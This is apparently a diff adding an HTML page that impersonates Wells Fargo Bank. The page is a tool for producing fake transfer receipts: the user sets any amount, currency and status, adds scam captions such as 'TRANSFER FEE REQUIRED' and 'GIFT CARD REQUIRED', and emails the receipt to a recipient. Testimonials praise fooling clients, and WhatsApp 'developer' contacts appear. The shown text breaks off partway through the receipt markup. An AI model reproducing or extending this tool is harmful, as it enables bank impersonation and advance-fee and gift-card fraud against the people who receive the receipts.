@@ -1,0 +1,1638 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Wells Fargo Bank</title>
+  <style>
+    /* Base Styles */
+    body {
+       margin: 0;
+       background: linear-gradient(135deg, #f5f7f8 0%, #e8ecf0 100%);
+       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+       color: #333;
+      min-height: 100vh;
+    }
+    
+    .container {
+       max-width: 500px;
+       margin: 20px auto;
+       padding: 25px;
+       background: white;
+       border-radius: 15px;
+       box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+       backdrop-filter: blur(10px);
+      border: 1px solid rgba(255,255,255,0.2);
+    }
+    
+    /* Hero Section */
+    .hero {
+      text-align: center;
+      padding: 30px 20px;
+      background: linear-gradient(135deg, #0a3e80 0%, #1e5aa8 50%, #2d6bb8 100%);
+      color: white;
+      border-radius: 15px;
+      margin-bottom: 25px;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 8px 25px rgba(10, 62, 128, 0.3);
+    }
+    
+    .hero:before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: radial-gradient(circle at 30% 20%, rgba(255,255,255,0.1) 0%, transparent 50%);
+    }
+    
+    .hero h1 {
+      margin: 0;
+      font-size: 32px;
+      font-weight: 700;
+      position: relative;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+    }
+    
+    .hero p {
+      margin: 15px 0 0;
+      font-size: 18px;
+      position: relative;
+      opacity: 0.95;
+    }
+    
+    /* Features Grid */
+    .features-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 18px;
+      margin: 25px 0;
+    }
+    
+    .feature-card {
+      background: linear-gradient(135deg, #ffffff 0%, #f8fafc 100%);
+      border-radius: 12px;
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      border: 1px solid rgba(10, 62, 128, 0.1);
+    }
+    
+    .feature-card:hover {
+      transform: translateY(-8px) scale(1.02);
+      box-shadow: 0 12px 30px rgba(10, 62, 128, 0.15);
+    }
+    
+    .feature-icon {
+      font-size: 28px;
+      margin-bottom: 12px;
+      color: #0a3e80;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
+    }
+    
+    .feature-card h4 {
+      margin: 0 0 8px 0;
+      color: #0a3e80;
+      font-weight: 600;
+    }
+    
+    .feature-card p {
+      margin: 0;
+      font-size: 14px;
+      color: #666;
+      line-height: 1.4;
+    }
+    
+    /* Balance Section */
+    .balance-section {
+      background: linear-gradient(135deg, #0a3e80 0%, #1e5aa8 100%);
+      color: white;
+      padding: 25px;
+      border-radius: 15px;
+      margin: 20px 0;
+      text-align: center;
+      box-shadow: 0 8px 25px rgba(10, 62, 128, 0.3);
+    }
+    
+    .balance-amount {
+      font-size: 36px;
+      font-weight: 700;
+      margin: 10px 0;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+    }
+    
+    .balance-label {
+      font-size: 16px;
+      opacity: 0.9;
+      margin-bottom: 15px;
+    }
+    
+    .balance-actions {
+      display: flex;
+      gap: 10px;
+      margin-top: 15px;
+    }
+    
+    .balance-btn {
+      flex: 1;
+      background: rgba(255,255,255,0.2);
+      border: 2px solid rgba(255,255,255,0.3);
+      color: white;
+      padding: 10px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: 600;
+      transition: all 0.3s ease;
+    }
+    
+    .balance-btn:hover {
+      background: rgba(255,255,255,0.3);
+      transform: translateY(-2px);
+    }
+    
+    /* Testimonials */
+    .testimonials {
+      margin: 30px 0;
+    }
+    
+    .testimonials h3 {
+      text-align: center;
+      color: #0a3e80;
+      margin-bottom: 20px;
+      font-size: 24px;
+    }
+    
+    .testimonial-card {
+      background: linear-gradient(135deg, #ffffff 0%, #f8fafc 100%);
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 18px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+      position: relative;
+      border-left: 4px solid #0a3e80;
+    }
+    
+    .testimonial-card:before {
+      content: """;
+      font-size: 48px;
+      position: absolute;
+      top: -10px;
+      right: 15px;
+      color: rgba(10, 62, 128, 0.1);
+      font-family: serif;
+      font-weight: bold;
+    }
+    
+    .testimonial-content {
+      font-style: italic;
+      margin-bottom: 15px;
+      line-height: 1.6;
+      color: #444;
+    }
+    
+    .testimonial-author {
+      display: flex;
+      align-items: center;
+    }
+    
+    .author-avatar {
+      width: 45px;
+      height: 45px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #0a3e80 0%, #1e5aa8 100%);
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 12px;
+      font-weight: bold;
+      font-size: 16px;
+      box-shadow: 0 3px 10px rgba(10, 62, 128, 0.3);
+    }
+    
+    .author-info {
+      flex: 1;
+    }
+    
+    .author-name {
+      font-weight: 600;
+      margin: 0;
+      color: #0a3e80;
+    }
+    
+    .author-title {
+      font-size: 13px;
+      color: #666;
+      margin: 2px 0 0 0;
+    }
+    
+    /* Visual Elements */
+    .visual-section {
+      display: flex;
+      justify-content: space-around;
+      margin: 25px 0;
+      padding: 20px;
+      background: linear-gradient(135deg, #f8fafc 0%, #e8ecf0 100%);
+      border-radius: 12px;
+    }
+    
+    .visual-element {
+      text-align: center;
+    }
+    
+    .visual-icon {
+      font-size: 32px;
+      color: #0a3e80;
+      margin-bottom: 8px;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
+    }
+    
+    .visual-element small {
+      font-weight: 500;
+      color: #666;
+    }
+    
+    /* Enhanced Receipt Styling */
+    .receipt-card {
+       background: #ffffff;
+       border-radius: 16px;
+       padding: 25px 20px;
+       box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+       margin: 20px auto;
+       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      max-width: 380px;
+      border: 1px solid #f0f0f0;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .receipt-card:before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 4px;
+      background: linear-gradient(90deg, #0a3e80 0%, #1e5aa8 50%, #2d6bb8 100%);
+    }
+    
+    .receipt-header {
+      text-align: center;
+      margin-bottom: 15px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid #f5f5f5;
+    }
+    
+    .receipt-logo {
+      font-size: 18px;
+      font-weight: 500;
+      color: #0a3e80;
+      margin-bottom: 3px;
+    }
+    
+    .receipt-subtitle {
+      font-size: 12px;
+      color: #666;
+      margin: 0;
+    }
+    
+    .receipt-amount {
+       font-size: 42px;
+       font-weight: 600;
+       margin: 15px 0;
+       color: #000000;
+      text-align: center;
+      letter-spacing: -1px;
+    }
+    
+    .status-successful {
+      background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+      color: white;
+      padding: 10px 16px;
+      border-radius: 8px;
+      text-align: center;
+      font-weight: 400;
+      font-size: 14px;
+      margin: 0 0 15px 0;
+      text-transform: capitalize;
+      box-shadow: 0 3px 10px rgba(40, 167, 69, 0.25);
+    }
+    
+    .status-pending {
+      background: linear-gradient(135deg, #ffc107 0%, #ffca2c 100%);
+      color: #000;
+      padding: 10px 16px;
+      border-radius: 8px;
+      text-align: center;
+      font-weight: 400;
+      font-size: 14px;
+      margin: 0 0 15px 0;
+      text-transform: capitalize;
+      box-shadow: 0 3px 10px rgba(255, 193, 7, 0.25);
+    }
+    
+    .status-failed {
+      background: linear-gradient(135deg, #dc3545 0%, #e74c3c 100%);
+      color: white;
+      padding: 10px 16px;
+      border-radius: 8px;
+      text-align: center;
+      font-weight: 400;
+      font-size: 14px;
+      margin: 0 0 15px 0;
+      text-transform: capitalize;
+      box-shadow: 0 3px 10px rgba(220, 53, 69, 0.25);
+    }
+    
+    .transaction-details {
+      margin: 0;
+      background: #f8fafc;
+      padding: 15px;
+      border-radius: 8px;
+      border: 1px solid #e2e8f0;
+    }
+    
+    .detail-row {
+       margin-bottom: 10px;
+       font-size: 14px;
+      line-height: 1.4;
+      color: #333;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    
+    .detail-label {
+      font-weight: 400;
+      color: #0a3e80;
+      flex: 1;
+    }
+    
+    .detail-value {
+      color: #333;
+      font-weight: 300;
+      text-align: right;
+      flex: 1;
+      word-break: break-word;
+    }
+    
+    .alert-caption {
+       color: #dc3545;
+       font-weight: bold;
+       font-size: 14px;
+       text-align: center;
+       margin: 0 0 20px 0;
+       padding: 12px 16px;
+       background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
+       border: 2px solid #dc3545;
+       border-radius: 8px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    
+    .receipt-buttons {
+       display: flex;
+       justify-content: space-between;
+       margin-top: 20px;
+       gap: 12px;
+    }
+    
+    .receipt-buttons button {
+       width: 48%;
+       background: linear-gradient(135deg, #1e5aa8 0%, #0a3e80 100%);
+       color: white;
+      border: none;
+      padding: 12px 16px;
+      border-radius: 8px;
+      font-weight: 500;
+      font-size: 14px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 3px 10px rgba(30, 90, 168, 0.25);
+    }
+    
+    .receipt-buttons button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(30, 90, 168, 0.4);
+    }
+    
+    /* Success Animation */
+    .success-animation {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+      color: white;
+      padding: 30px;
+      border-radius: 20px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+      z-index: 1000;
+      box-shadow: 0 15px 35px rgba(40, 167, 69, 0.4);
+      animation: successPulse 2s ease-in-out;
+    }
+    
+    @keyframes successPulse {
+      0% { transform: translate(-50%, -50%) scale(0.5); opacity: 0; }
+      50% { transform: translate(-50%, -50%) scale(1.1); opacity: 1; }
+      100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+    }
+    
+    /* Original Styles Enhanced */
+    h2, h3 {
+       text-align: center;
+       color: #0a3e80;
+       font-weight: 600;
+    }
+    
+    input, select, button {
+       width: 100%;
+       padding: 12px 16px;
+       margin-top: 12px;
+       border: 2px solid #e2e8f0;
+       border-radius: 8px;
+       font-size: 15px;
+      transition: all 0.3s ease;
+      box-sizing: border-box;
+    }
+    
+    input:focus, select:focus {
+      outline: none;
+      border-color: #0a3e80;
+      box-shadow: 0 0 0 3px rgba(10, 62, 128, 0.1);
+    }
+    
+    button {
+       background: linear-gradient(135deg, #0a3e80 0%, #1e5aa8 100%);
+       color: white;
+       font-weight: 600;
+       cursor: pointer;
+       border: none;
+      box-shadow: 0 4px 15px rgba(10, 62, 128, 0.3);
+      transition: all 0.3s ease;
+    }
+    
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(10, 62, 128, 0.4);
+    }
+    
+    .nav {
+       display: flex;
+       justify-content: space-between;
+       margin: 15px 0;
+       gap: 10px;
+    }
+    
+    .nav button {
+       flex: 1;
+       margin: 0;
+      padding: 12px 8px;
+      font-size: 14px;
+    }
+    
+    .hidden { display: none; }
+    
+    /* Profile Section Enhancement */
+    #profile-pic-display, #dashboard-pic {
+       border-radius: 50%;
+       width: 100px;
+       height: 100px;
+       margin-bottom: 20px;
+       border: 4px solid #0a3e80;
+      box-shadow: 0 4px 15px rgba(10, 62, 128, 0.3);
+    }
+    
+    .welcome-msg {
+       text-align: center;
+       font-size: 18px;
+       margin-top: 20px;
+       color: #0a3e80;
+       font-weight: 500;
+    }
+    
+    .whatsapp-link { text-align: center; margin-top: 20px; }
+    .whatsapp-link a {
+       color: #25D366;
+       font-weight: bold;
+       text-decoration: none;
+       padding: 10px 20px;
+      background: rgba(37, 211, 102, 0.1);
+      border-radius: 25px;
+      transition: all 0.3s ease;
+    }
+    
+    .whatsapp-link a:hover {
+      background: rgba(37, 211, 102, 0.2);
+      transform: translateY(-2px);
+    }
+    
+    .history-item { margin-bottom: 20px; }
+    .loading { opacity: 0.6; pointer-events: none; }
+    
+    .email-status {
+       margin-top: 12px;
+       padding: 12px 16px;
+       border-radius: 8px;
+       text-align: center;
+       font-weight: 600;
+     }
+    
+    .email-success {
+       background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
+       color: #155724;
+       border: 1px solid #c3e6cb;
+     }
+    
+    .email-error {
+       background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
+       color: #721c24;
+       border: 1px solid #f5c6cb;
+     }
+    
+    .optional-field { margin-top: 18px; }
+    .optional-field label {
+       display: block;
+       margin-bottom: 8px;
+       font-weight: 600;
+       color: #0a3e80;
+     }
+    
+    /* Developer Contact Section */
+    .developer-contact {
+      background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
+      color: white;
+      padding: 20px;
+      border-radius: 12px;
+      margin-top: 25px;
+      text-align: center;
+      box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
+    }
+    
+    .developer-contact h4 {
+      margin: 0 0 12px 0;
+      font-size: 18px;
+    }
+    
+    .developer-contact p {
+      margin: 8px 0;
+      font-size: 15px;
+    }
+    
+    .whatsapp-support {
+      background: rgba(255,255,255,0.2);
+      color: white;
+      padding: 12px 24px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 25px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 15px;
+      text-decoration: none;
+      display: inline-block;
+      transition: all 0.3s ease;
+    }
+    
+    .whatsapp-support:hover {
+      background: rgba(255,255,255,0.3);
+      color: white;
+      transform: translateY(-2px);
+    }
+    
+    /* Modal Styles */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.5);
+      backdrop-filter: blur(5px);
+    }
+    
+    .modal-content {
+      background-color: white;
+      margin: 10% auto;
+      padding: 30px;
+      border-radius: 15px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+    }
+    
+    .close {
+      color: #aaa;
+      float: right;
+      font-size: 28px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    
+    .close:hover {
+      color: #000;
+    }
+    
+    /* Responsive */
+    @media(max-width:600px){
+       .container { margin:10px; padding: 20px; }
+       .receipt-card { margin: 10px; padding: 25px 20px; max-width: 350px; }
+      .receipt-amount { font-size: 42px; }
+      .features-grid { grid-template-columns: 1fr; }
+      .hero h1 { font-size: 28px; }
+      .hero p { font-size: 16px; }
+      .balance-actions { flex-direction: column; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Auth Section -->
+  <div class="container" id="auth">
+    <!-- Hero Welcome Section -->
+    <div class="hero">
+      <h1>🏦 Wells Fargo Bank</h1>
+      <p>Your trusted financial partner for seamless transactions</p>
+    </div>
+    
+    <!-- Features Section -->
+    <div class="features-grid">
+      <div class="feature-card">
+        <div class="feature-icon">💸</div>
+        <h4>Instant Transfers</h4>
+        <p>Send money to clients in seconds</p>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon">🧾</div>
+        <h4>Transaction Receipts</h4>
+        <p>Generate sharp transaction records</p>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon">📧</div>
+        <h4>Email Alerts</h4>
+        <p>Real-time notifications</p>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon">🔒</div>
+        <h4>Secure Banking</h4>
+        <p>Your transactions are protected</p>
+      </div>
+    </div>
+    
+    <!-- Visual Elements -->
+    <div class="visual-section">
+      <div class="visual-element">
+        <div class="visual-icon">💼</div>
+        <small>Office Ready</small>
+      </div>
+      <div class="visual-element">
+        <div class="visual-icon">💻</div>
+        <small>Laptop Friendly</small>
+      </div>
+      <div class="visual-element">
+        <div class="visual-icon">💰</div>
+        <small>Money Safe</small>
+      </div>
+    </div>
+    
+    <!-- Testimonials -->
+    <div class="testimonials">
+      <h3>What Our Users Say</h3>
+      
+      <div class="testimonial-card">
+        <div class="testimonial-content">
+          "Wells Fargo Bank has simplified my business transactions. The receipts look so professional my clients think I have a whole accounting team!"
+        </div>
+        <div class="testimonial-author">
+          <div class="author-avatar">AO</div>
+          <div class="author-info">
+            <p class="author-name">Adebayo O.</p>
+            <p class="author-title">Freelancer, Lagos | Age 24</p>
+          </div>
+        </div>
+      </div>
+      
+      <div class="testimonial-card">
+        <div class="testimonial-content">
+          "As a student running a small business, the email alerts save me so much time. I don't have to manually notify clients about payments anymore."
+        </div>
+        <div class="testimonial-author">
+          <div class="author-avatar">CE</div>
+          <div class="author-info">
+            <p class="author-name">Chioma E.</p>
+            <p class="author-title">Student Entrepreneur, Abuja | Age 22</p>
+          </div>
+        </div>
+      </div>
+      
+      <div class="testimonial-card">
+        <div class="testimonial-content">
+          "The different transaction status options help me manage expectations with my customers. Failed payment alerts with reasons are a game-changer!"
+        </div>
+        <div class="testimonial-author">
+          <div class="author-avatar">IK</div>
+          <div class="author-info">
+            <p class="author-name">Ibrahim K.</p>
+            <p class="author-title">E-commerce Seller, Kano | Age 26</p>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+    <!-- Call to Action -->
+    <div style="text-align: center; margin: 25px 0;">
+      <h3>Ready to Experience Better Banking?</h3>
+      <p>Join thousands of Nigerians enjoying stress-free transactions</p>
+      
+      <div style="background: linear-gradient(135deg, #f0f8ff 0%, #e6f3ff 100%); padding: 20px; border-radius: 12px; margin: 20px 0; border: 1px solid rgba(10, 62, 128, 0.1);">
+        <p><strong>For any issues or feature requests:</strong></p>
+        <a href="https://wa.me/17062481811" style="background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); color: white; padding: 12px 24px; border-radius: 25px; text-decoration: none; display: inline-block; margin-top: 12px; font-weight: 600; box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3); transition: all 0.3s ease;">
+          📱 Contact Owner on WhatsApp
+        </a>
+      </div>
+    </div>
+    
+    <!-- Auth Content -->
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='100' height='100' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='40' fill='%23e2e8f0'/%3E%3Ctext x='50' y='55' text-anchor='middle' font-size='20' fill='%23666'%3E👤%3C/text%3E%3C/svg%3E" id="profile-pic-display" class="hidden" alt="Profile Picture">
+    <div class="welcome-msg"><p>Register or Login to access your dashboard.</p></div>
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="register()">Register</button>
+    <button onclick="login()">Login</button>
+  </div>
+
+  <!-- Dashboard Section -->
+  <div class="container hidden" id="dashboard">
+    <h2>Welcome, <span id="user-name"></span> 👋</h2>
+    <img id="dashboard-pic" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='100' height='100' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='40' fill='%23e2e8f0'/%3E%3Ctext x='50' y='55' text-anchor='middle' font-size='20' fill='%23666'%3E👤%3C/text%3E%3C/svg%3E" alt="Profile Picture" style="border-radius: 50%; width: 100px; height: 100px; margin-bottom: 10px;">
+    
+    <!-- Balance Section -->
+    <div class="balance-section">
+      <div class="balance-label">Your Balance</div>
+      <div class="balance-amount" id="balance-display">$0.00</div>
+      <div class="balance-actions">
+        <button class="balance-btn" onclick="showAddFunds()">💰 Add Funds</button>
+        <button class="balance-btn" onclick="showBalanceSettings()">⚙️ Settings</button>
+      </div>
+    </div>
+    
+    <div class="nav">
+      <button onclick="showTransfer()">💸 Transfer</button>
+      <button onclick="showHistory()">📊 History</button>
+      <button onclick="showSettings()">⚙️ Settings</button>
+      <button onclick="logout()">🚪 Logout</button>
+    </div>
+
+    <!-- Transfer Section -->
+    <div id="transfer">
+      <h3>💰 Make a Transfer</h3>
+      <input type="text" id="sender-name" placeholder="Sender Name">
+      <input type="text" id="acc-number" placeholder="Recipient Account Number">
+      <input type="text" id="acc-name" placeholder="Recipient Account Name">
+      <input type="text" id="bank-name" placeholder="Bank Name">
+      <input type="text" id="swift-code" placeholder="SWIFT Code">
+      <input type="text" id="remark" placeholder="Remark / Description">
+      <input type="number" id="amount" placeholder="Amount">
+      <select id="currency">
+        <option value="$">$ USD - US Dollar</option>
+        <option value="€">€ EUR - Euro</option>
+        <option value="£">£ GBP - British Pound</option>
+        <option value="¥">¥ JPY - Japanese Yen</option>
+        <option value="₦">₦ NGN - Nigerian Naira</option>
+        <option value="$">$ MXN - Mexican Peso</option>
+        <option value="₹">₹ INR - Indian Rupee</option>
+        <option value="₣">₣ CHF - Swiss Franc</option>
+        <option value="₩">₩ KRW - South Korean Won</option>
+        <option value="₺">₺ TRY - Turkish Lira</option>
+        <option value="₽">₽ RUB - Russian Ruble</option>
+        <option value="د.إ">د.إ AED - UAE Dirham</option>
+        <option value="R$">R$ BRL - Brazilian Real</option>
+        <option value="C$">C$ CAD - Canadian Dollar</option>
+        <option value="A$">A$ AUD - Australian Dollar</option>
+        <option value="NZ$">NZ$ NZD - New Zealand Dollar</option>
+        <option value="R">R ZAR - South African Rand</option>
+        <option value="kr">kr SEK - Swedish Krona</option>
+        <option value="kr">kr DKK - Danish Krone</option>
+        <option value="kr">kr NOK - Norwegian Krone</option>
+        <option value="฿">฿ THB - Thai Baht</option>
+        <option value="₫">₫ VND - Vietnamese Dong</option>
+        <option value="₪">₪ ILS - Israeli Shekel</option>
+        <option value="₱">₱ PHP - Philippine Peso</option>
+        <option value="RM">RM MYR - Malaysian Ringgit</option>
+        <option value="S$">S$ SGD - Singapore Dollar</option>
+        <option value="HK$">HK$ HKD - Hong Kong Dollar</option>
+        <option value="NT$">NT$ TWD - New Taiwan Dollar</option>
+        <option value="₡">₡ CRC - Costa Rican Colon</option>
+        <option value="₲">₲ PYG - Paraguayan Guarani</option>
+        <option value="₸">₸ KZT - Kazakhstani Tenge</option>
+        <option value="zł">zł PLN - Polish Zloty</option>
+        <option value="Kč">Kč CZK - Czech Koruna</option>
+        <option value="Ft">Ft HUF - Hungarian Forint</option>
+        <option value="₴">₴ UAH - Ukrainian Hryvnia</option>
+        <option value="¢">¢ GHS - Ghanaian Cedi</option>
+        <option value="₵">₵ GHC - Ghana Cedi</option>
+        <option value="₨">₨ PKR - Pakistani Rupee</option>
+        <option value="₨">₨ LKR - Sri Lankan Rupee</option>
+        <option value="₨">₨ NPR - Nepalese Rupee</option>
+        <option value="₨">₨ SCR - Seychellois Rupee</option>
+        <option value="₨">₨ MUR - Mauritian Rupee</option>
+        <option value="Rp">Rp IDR - Indonesian Rupiah</option>
+        <option value="Br">Br ETB - Ethiopian Birr</option>
+        <option value="KSh">KSh KES - Kenyan Shilling</option>
+        <option value="USh">USh UGX - Ugandan Shilling</option>
+        <option value="TSh">TSh TZS - Tanzanian Shilling</option>
+        <option value="RWF">RWF - Rwandan Franc</option>
+        <option value="CFA">CFA XOF - West African CFA Franc</option>
+        <option value="FCFA">FCFA XAF - Central African CFA Franc</option>
+        <option value="MAD">MAD - Moroccan Dirham</option>
+        <option value="E£">E£ EGP - Egyptian Pound</option>
+        <option value="DA">DA DZD - Algerian Dinar</option>
+        <option value="DT">DT TND - Tunisian Dinar</option>
+        <option value="LD">LD LYD - Libyan Dinar</option>
+        <option value="SDG">SDG - Sudanese Pound</option>
+        <option value="ZK">ZK ZMW - Zambian Kwacha</option>
+        <option value="P">P BWP - Botswana Pula</option>
+        <option value="N$">N$ NAD - Namibian Dollar</option>
+        <option value="L">L SZL - Swazi Lilangeni</option>
+        <option value="M">M LSL - Lesotho Loti</option>
+        <option value="MT">MT MZN - Mozambican Metical</option>
+        <option value="Kz">Kz AOA - Angolan Kwanza</option>
+        <option value="MK">MK MWK - Malawian Kwacha</option>
+        <option value="Ar">Ar MGA - Malagasy Ariary</option>
+        <option value="CF">CF KMF - Comorian Franc</option>
+        <option value="$">$ CVE - Cape Verdean Escudo</option>
+        <option value="Db">Db STP - São Tomé and Príncipe Dobra</option>
+        <option value="D">D GMD - Gambian Dalasi</option>
+        <option value="FG">FG GNF - Guinean Franc</option>
+        <option value="Le">Le SLL - Sierra Leonean Leone</option>
+        <option value="L$">L$ LRD - Liberian Dollar</option>
+        <option value="FC">FC CDF - Congolese Franc</option>
+        <option value="FBu">FBu BIF - Burundian Franc</option>
+        <option value="Fdj">Fdj DJF - Djiboutian Franc</option>
+        <option value="Nfk">Nfk ERN - Eritrean Nakfa</option>
+        <option value="Sh">Sh SOS - Somali Shilling</option>
+        <option value="SS£">SS£ SSP - South Sudanese Pound</option>
+        <option value="¥">¥ CNY - Chinese Yuan</option>
+        <option value="₩">₩ KPW - North Korean Won</option>
+        <option value="₮">₮ MNT - Mongolian Tugrik</option>
+        <option value="Nu">Nu BTN - Bhutanese Ngultrum</option>
+        <option value="Rf">Rf MVR - Maldivian Rufiyaa</option>
+        <option value="؋">؋ AFN - Afghan Afghani</option>
+        <option value="₼">₼ AZN - Azerbaijani Manat</option>
+        <option value="₾">₾ GEL - Georgian Lari</option>
+        <option value="₿">₿ BTC - Bitcoin</option>
+        <option value="Ξ">Ξ ETH - Ethereum</option>
+        <option value="₳">₳ ADA - Cardano</option>
+        <option value="Ł">Ł LTC - Litecoin</option>
+        <option value="Ð">Ð DOGE - Dogecoin</option>
+        <option value="XRP">XRP - Ripple</option>
+        <option value="BNB">BNB - Binance Coin</option>
+        <option value="SOL">SOL - Solana</option>
+        <option value="MATIC">MATIC - Polygon</option>
+        <option value="DOT">DOT - Polkadot</option>
+        <option value="AVAX">AVAX - Avalanche</option>
+        <option value="LINK">LINK - Chainlink</option>
+        <option value="UNI">UNI - Uniswap</option>
+        <option value="ATOM">ATOM - Cosmos</option>
+        <option value="ALGO">ALGO - Algorand</option>
+        <option value="VET">VET - VeChain</option>
+        <option value="ICP">ICP - Internet Computer</option>
+        <option value="FIL">FIL - Filecoin</option>
+        <option value="THETA">THETA - Theta Network</option>
+        <option value="TRX">TRX - TRON</option>
+        <option value="ETC">ETC - Ethereum Classic</option>
+        <option value="XLM">XLM - Stellar</option>
+        <option value="HBAR">HBAR - Hedera</option>
+        <option value="NEAR">NEAR - NEAR Protocol</option>
+        <option value="FLOW">FLOW - Flow</option>
+        <option value="EGLD">EGLD - MultiversX</option>
+        <option value="XTZ">XTZ - Tezos</option>
+        <option value="MANA">MANA - Decentraland</option>
+        <option value="SAND">SAND - The Sandbox</option>
+        <option value="AXS">AXS - Axie Infinity</option>
+        <option value="CHZ">CHZ - Chiliz</option>
+        <option value="ENJ">ENJ - Enjin Coin</option>
+      </select>
+      <select id="transaction-status">
+        <option value="success">✅ Successful</option>
+        <option value="pending">⏳ Pending</option>
+        <option value="failed">❌ Failed</option>
+      </select>
+      
+      <div class="optional-field">
+        <label for="alert-caption">🚨 Alert Caption (Optional):</label>
+        <select id="alert-caption">
+          <option value="">None</option>
+          <option value="ACCOUNT AUTHENTICATION REQUIRED">ACCOUNT AUTHENTICATION REQUIRED</option>
+          <option value="ACCOUNT NOT VERIFIED">ACCOUNT NOT VERIFIED</option>
+          <option value="ACCOUNT VERIFICATION FAILED">ACCOUNT VERIFICATION FAILED</option>
+          <option value="TRANSFER FEE REQUIRED">TRANSFER FEE REQUIRED</option>
+          <option value="GIFT CARD REQUIRED">GIFT CARD REQUIRED</option>
+          <option value="GIFT CARD INVALID">GIFT CARD INVALID</option>
+          <option value="LINK GIFT CARD TO ACCOUNT">LINK GIFT CARD TO ACCOUNT</option>
+          <option value="ACCOUNT SUSPENDED">ACCOUNT SUSPENDED</option>
+          <option value="INVALID GIFT CARD">INVALID GIFT CARD</option>
+        </select>
+      </div>
+      
+      <input type="email" id="recipient-email" placeholder="📧 Recipient Email" required>
+      <button onclick="submitTransfer()" id="submit-btn">🚀 Submit Transfer</button>
+      <div id="email-status"></div>
+    </div>
+
+    <!-- History Section -->
+    <div id="history" class="hidden">
+      <h3>📊 Transaction History</h3>
+      <div id="history-list"></div>
+    </div>
+
+    <!-- Settings Section -->
+    <div id="settings" class="hidden">
+      <h3>⚙️ Settings</h3>
+      <input type="file" id="profile-pic" onchange="uploadProfilePic()">
+      <button onclick="deleteAccount()">🗑️ Delete Account</button>
+      <button onclick="borrowLoan()">💰 Borrow Loan</button>
+      <div class="whatsapp-link">
+        <a href="https://wa.me/17062948306" target="_blank">📱 Contact us on WhatsApp</a>
+      </div>
+      
+      <!-- Developer Contact Section -->
+      <div class="developer-contact">
+        <h4>🔧 Developer Support</h4>
+        <p><strong>CBL</strong></p>
+        <p>Need technical assistance or custom features?</p>
+        <a href="https://wa.me/17062481811" target="_blank" class="whatsapp-support">
+          📱 WhatsApp Developer: +1 (706) 248-1811
+        </a>
+      </div>
+    </div>
+
+    <!-- Receipt Section -->
+    <div id="receipt" class="hidden">
+      <h3>🧾 Transaction Receipt</h3>
+      <div class="receipt-card" id="receipt-card">
+        <div class="receipt-header">
+          <div class="receipt-logo">🏦 Wells Fargo</div>
+          <p class="receipt-subtitle">Transaction Receipt</p>
+        </div>
+        
+        <div class="receipt-amount" id="receipt-amount"></div>
+        
+        <div id="receipt-status-container"></div>
+        
+        <div id="alert-caption-display"></div>
+        
+        <div class="transaction-details">
+          <div class="detail-row">
+            <span class="detail-label">Transaction ID:</span>
+            <span class="detail-value" id="transaction-id"></span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">Sender Name:</span>
+            <span class="detail-value" id="sender-name-display"></span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">Sender Account:</span>
